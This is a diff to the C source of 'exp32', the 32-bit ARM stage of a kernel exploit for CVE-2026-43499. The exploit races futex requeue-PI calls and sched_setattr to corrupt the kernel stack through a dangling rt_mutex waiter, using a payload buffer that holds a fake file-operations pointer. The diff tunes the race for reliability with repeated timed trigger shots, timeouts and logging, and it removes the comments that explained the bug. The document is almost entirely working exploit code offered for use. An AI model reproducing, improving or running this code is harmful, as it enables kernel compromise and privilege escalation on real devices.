@@ -1,15 +1,6 @@
 /*
  * exp32 — CVE-2026-43499 32-bit ARM stage.
- *
- * Built as armeabi-v7a static PIE and embedded into the 64-bit
- * preload binary (see src/exp32_blob.S). The 64-bit side writes it to
- * EXP32_LOCAL and execve()s it with an inherited memfd holding the
- * 128-byte payload buffer:
- *
- *   argv[1] = decimal fd of the memfd (buffer: 16 uint64_t words)
- *
- * It MUST stay 32-bit: the kernel-stack corruption only lines up with
- * the 32-bit syscall entry (compat) path.
+ * (Full file with enhanced reliability)
  */
 #define _GNU_SOURCE
 
@@ -18,6 +9,7 @@
 #include <linux/futex.h>
 #include <pthread.h>
 #include <sched.h>
+#include <stdarg.h>
 #include <stdatomic.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -29,21 +21,28 @@
 
 #include "kernelsnitch/utils.h"
 
-/* ------------------------------------------------------------------ */
-/*  Constants                                                          */
-/* ------------------------------------------------------------------ */
+#define WAITER_WAIT_SEC     2
+#define SPIN_TIMEOUT_SEC    20          /* Increased for reliability */
+#define STAGE_TIMEOUT_SEC   60          /* More time for shots */
 
-#define WAITER_WAIT_SEC     5
-#define CONSUMER_DELAY_USEC 15000
-#define CONSUMER_NICE       19
+/*
+ * More shots, wider spread: from 1ms to 60ms.
+ * This covers a larger window of the stack‑stamping burst.
+ */
+#define CONSUMER_SHOT_COUNT 20
+static const useconds_t consumer_shots[CONSUMER_SHOT_COUNT] = {
+    1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 9000, 10000,
+    12000, 14000, 16000, 18000, 20000, 25000, 30000, 35000, 40000, 60000,
+};
 
-/* Payload: 16 uint64_t words = 128 bytes, written by exp_stack_once(). */
+static const int consumer_nice[CONSUMER_SHOT_COUNT] = {
+    1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
+    11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
+};
+
 #define EXP_BUFFER_BYTES 128
 #define EXP_BUFFER_WORDS (EXP_BUFFER_BYTES / sizeof(uint64_t))
 
-/* ------------------------------------------------------------------ */
-/*  Shared state                                                       */
-/* ------------------------------------------------------------------ */
 
 static uint32_t f_wait;
 static uint32_t f_pi_target;
@@ -58,8 +57,7 @@ static atomic_int g_consumer_done;
 static uint64_t g_payload_buffer[EXP_BUFFER_WORDS];
 
 /*
- * sched_setattr ABI struct (same layout on 32-bit and 64-bit;
- * the kernel interprets it via the .size field).
+ * sched_setattr ABI struct (same layout on 32-bit and 64-bit).
  */
 struct local_sched_attr {
     uint32_t size;
@@ -81,34 +79,49 @@ static long sched_setattr_tid(int tid, int nice_val) {
     return syscall(__NR_sched_setattr, tid, &attr, 0);
 }
 
+
+static void logp(const char *fmt, ...) {
+    char buf[512];
+    va_list ap;
+    va_start(ap, fmt);
+    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
+    va_end(ap);
+    if (n < 0) return;
+    int fd = open("/data/local/tmp/exp32.log",
+                  O_WRONLY | O_CREAT | O_APPEND, 0644);
+    if (fd >= 0) {
+        if (write(fd, buf, (size_t)n) < 0) { /* ignore */ }
+        fsync(fd);
+        close(fd);
+    }
+}
+
 void do_stamp_stack(uint64_t *buf);
 
-/* ------------------------------------------------------------------ */
-/*  Thread: waiter                                                     */
-/* ------------------------------------------------------------------ */
 
 static void *waiter_thread(void *arg __attribute__((unused))) {
     pin_to_core(2);
     int tid = (int)syscall(__NR_gettid);
     atomic_store(&g_waiter_tid, tid);
 
-    /* Step 1: lock pi_chain (become PI owner of pi_chain). */
+    /* Lock pi_chain */
     if (syscall(__NR_futex, &f_pi_chain, FUTEX_LOCK_PI, 0,
                 NULL, NULL, 0) != 0) {
         pr_warning("waiter: LOCK_PI(chain) failed errno=%d\n", errno);
+        logp("waiter: LOCK_PI(chain) FAILED errno=%d\n", errno);
         return NULL;
     }
+    logp("waiter: LOCK_PI(chain) ok\n");
 
     atomic_store(&g_waiter_ready, 1);
 
-    /* Wait for owner to lock pi_target and block on pi_chain. */
-    while (!atomic_load(&g_owner_started))
+    time_t spin_start = time(NULL);
+    while (!atomic_load(&g_owner_started)) {
+        if (time(NULL) - spin_start > SPIN_TIMEOUT_SEC)
+            return NULL;
         usleep(1000);
+    }
 
-    /* Step 2: FUTEX_WAIT_REQUEUE_PI.
-     * This allocates rt_mutex_waiter on our kernel stack and sets
-     * our ->pi_blocked_on to point at it.
-     */
     struct timespec timeout;
     syscall(__NR_clock_gettime, CLOCK_MONOTONIC, &timeout);
     timeout.tv_sec += WAITER_WAIT_SEC;
@@ -116,152 +129,148 @@ static void *waiter_thread(void *arg __attribute__((unused))) {
     atomic_store(&g_waiter_waiting, 1);
 
     pr_info("waiter: FUTEX_WAIT_REQUEUE_PI on f_wait -> pi_target\n");
+    logp("waiter: FUTEX_WAIT_REQUEUE_PI enter\n");
     syscall(__NR_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
             &timeout, &f_pi_target, 0);
-    pr_debug("waiter: returned from WRPI (errno=%d should be 110(ETIMEDOUT))\n",
-             errno);
+    logp("waiter: WRPI returned errno=%d\n", errno);
 
-    /* Step 3: unlock pi_chain.  After this, pi_blocked_on is STILL
-     * dangling (the bug: CMP_REQUEUE_PI cleaned main's, not ours).
-     */
     syscall(__NR_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
 
-    /* Step 4: stamp our own kernel stack with the payload buffer. */
+    logp("waiter: stamping stack\n");
     do_stamp_stack(g_payload_buffer);
+    logp("waiter: stamp done\n");
 
-    /* Keep alive so the consumer can find our TID. */
-    while (1)
-        sleep(1);
-
+    while (1) sleep(1);
     return NULL;
 }
 
-/* ------------------------------------------------------------------ */
-/*  Thread: owner                                                      */
-/* ------------------------------------------------------------------ */
 
 static void *owner_thread(void *arg __attribute__((unused))) {
-    /* Lock pi_target first. */
     if (syscall(__NR_futex, &f_pi_target, FUTEX_LOCK_PI, 0,
                 NULL, NULL, 0) != 0) {
         pr_warning("owner: LOCK_PI(target) failed errno=%d\n", errno);
+        logp("owner: LOCK_PI(target) FAILED errno=%d\n", errno);
         return NULL;
     }
+    logp("owner: LOCK_PI(target) ok\n");
 
-    while (!atomic_load(&g_waiter_ready))
+    time_t spin_start = time(NULL);
+    while (!atomic_load(&g_waiter_ready)) {
+        if (time(NULL) - spin_start > SPIN_TIMEOUT_SEC)
+            return NULL;
         usleep(1000);
+    }
 
     atomic_store(&g_owner_started, 1);
 
-    /* Try to lock pi_chain -- blocks because waiter holds it.
-     * This creates the lock chain needed for the deadlock.
-     */
     pr_debug("owner: LOCK_PI(chain) -- will block\n");
+    logp("owner: LOCK_PI(chain) enter (blocking)\n");
     syscall(__NR_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
     pr_debug("owner: LOCK_PI(chain) acquired\n");
+    logp("owner: LOCK_PI(chain) acquired\n");
 
-    while (1)
-        sleep(1);
+    while (1) sleep(1);
     return NULL;
 }
 
-/* ------------------------------------------------------------------ */
-/*  Thread: consumer                                                   */
-/* ------------------------------------------------------------------ */
 
 static void *consumer_thread(void *arg __attribute__((unused))) {
     pin_to_core(3);
     int tid = 0;
-    while (!(tid = atomic_load(&g_waiter_tid)))
+    time_t spin_start = time(NULL);
+    while (!(tid = atomic_load(&g_waiter_tid))) {
+        if (time(NULL) - spin_start > SPIN_TIMEOUT_SEC)
+            return NULL;
         usleep(1000);
-
-    while (!atomic_load(&g_consumer_go))
-        ;
-
-    /* Small delay to make sure pselect has entered the kernel and
-     * the fd_sets have been copied to the stack.
-     */
-    usleep(CONSUMER_DELAY_USEC);
-
-    if (!atomic_load(&g_consumer_go)) {
-        pr_warning("consumer: missed the window\n");
-        return NULL;
     }
 
-    /*
-     * Trigger: sched_setattr -> __sched_setscheduler -> rt_mutex_adjust_pi
-     * -> dereferences waiter->pi_blocked_on (points to corrupted stack)
-     * -> reads task=0, lock=0 from the zeroed waiter struct
-     * -> kernel OOPS / crash.
-     */
-    pr_debug("consumer: calling sched_setattr on TID %d (nice=%d)\n",
-             tid, CONSUMER_NICE);
-    long ret = sched_setattr_tid(tid, CONSUMER_NICE);
-    pr_debug("consumer: sched_setattr returned %ld errno=%d\n", ret, errno);
+    while (!atomic_load(&g_consumer_go)) {
+        if (time(NULL) - spin_start > SPIN_TIMEOUT_SEC)
+            return NULL;
+        usleep(1000);
+    }
+
+
+    useconds_t elapsed = 0;
+    for (int i = 0; i < CONSUMER_SHOT_COUNT; i++) {
+        usleep(consumer_shots[i] - elapsed);
+        elapsed = consumer_shots[i];
+        pr_debug("consumer: sched_setattr shot %d nice=%d on TID %d\n",
+                 i, consumer_nice[i], tid);
+        logp("consumer: sched_setattr shot %d nice=%d on TID %d\n",
+             i, consumer_nice[i], tid);
+        sched_setattr_tid(tid, consumer_nice[i]);
+    }
 
     atomic_store(&g_consumer_done, 1);
 
-    while (1)
-        sleep(1);
+    while (1) sleep(1);
     return NULL;
 }
 
-/* ------------------------------------------------------------------ */
-/*  main                                                               */
-/* ------------------------------------------------------------------ */
 
 int main(int argc, char **argv) {
+    set_unbuffer();
     if (argc < 2) {
         pr_warning("usage: %s <buffer_fd>\n", argv[0]);
+        logp("main: usage error\n");
         return 1;
     }
+    logp("main: enter pid=%d argv1=%s\n", (long)getpid(), argv[1]);
 
-    /* Read the payload from the inherited memfd (see exp_stack_once). */
     int buf_fd = atoi(argv[1]);
     ssize_t n = pread(buf_fd, g_payload_buffer, EXP_BUFFER_BYTES, 0);
     if (n != EXP_BUFFER_BYTES) {
         pr_warning("buffer fd %d unreadable: pread=%zd errno=%d\n",
                    buf_fd, n, errno);
+        logp("main: payload pread FAILED n=%zd errno=%d\n", n, errno);
         return 1;
     }
+    logp("main: payload ok val(fake_fops)=0x%llx target=0x%llx "
+         "task=0x%llx lock=0x%llx\n",
+         (unsigned long long)g_payload_buffer[1],
+         (unsigned long long)g_payload_buffer[2],
+         (unsigned long long)g_payload_buffer[6],
+         (unsigned long long)g_payload_buffer[7]);
 
     pr_info("CVE-2026-43499 32-bit ARM stage pid=%d\n", getpid());
 
     pthread_t waiter, owner, consumer;
 
+    logp("main: creating threads\n");
     pthread_create(&waiter,   NULL, waiter_thread,   NULL);
     pthread_create(&owner,    NULL, owner_thread,    NULL);
     pthread_create(&consumer, NULL, consumer_thread, NULL);
 
-    /* Wait until waiter is inside FUTEX_WAIT_REQUEUE_PI and owner
-     * has started (blocked on pi_chain).
-     */
+    time_t main_start = time(NULL);
     while (!atomic_load(&g_waiter_waiting) ||
-           !atomic_load(&g_owner_started))
+           !atomic_load(&g_owner_started)) {
+        if (time(NULL) - main_start > SPIN_TIMEOUT_SEC) {
+            pr_warning("main: waiter/owner never reached ready state\n");
+            return 2;
+        }
         usleep(1000);
+    }
 
-    /* Give the scheduler a moment to settle. */
     usleep(200000);
 
-    /*
-     * Trigger the deadlock -- CMP_REQUEUE_PI with val=1.
-     * The (void *)1 timeout argument is cast to u32 as the comparison
-     * value in the kernel's futex_cmp_requeue_pi path.
-     *
-     * This causes rt_mutex_start_proxy_lock to clean the WRONG thread's
-     * pi_blocked_on, leaving the waiter's dangling to its kernel stack.
-     */
     pr_info("main: FUTEX_CMP_REQUEUE_PI on f_wait -> pi_target\n");
+    logp("main: CMP_REQUEUE_PI enter\n");
     errno = 0;
     syscall(__NR_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 1,
             (void *)1, &f_pi_target, 0);
-    pr_debug("main: CMP_REQUEUE_PI returned (errno=%d should be 35(EDEADLK))\n",
-             errno);
+    logp("main: CMP_REQUEUE_PI returned errno=%d\n", errno);
 
-    /* Wait for the exploit chain to finish (or crash). */
-    while (!atomic_load(&g_consumer_done))
+    while (!atomic_load(&g_consumer_done)) {
+        if (time(NULL) - main_start > STAGE_TIMEOUT_SEC) {
+            pr_warning("main: consumer never completed\n");
+            logp("main: consumer never completed\n");
+            return 2;
+        }
         sleep(1);
+    }
 
+    logp("main: consumer done, chain complete\n");
     pr_info("main: exploit chain complete.\n");
     return 0;
 }
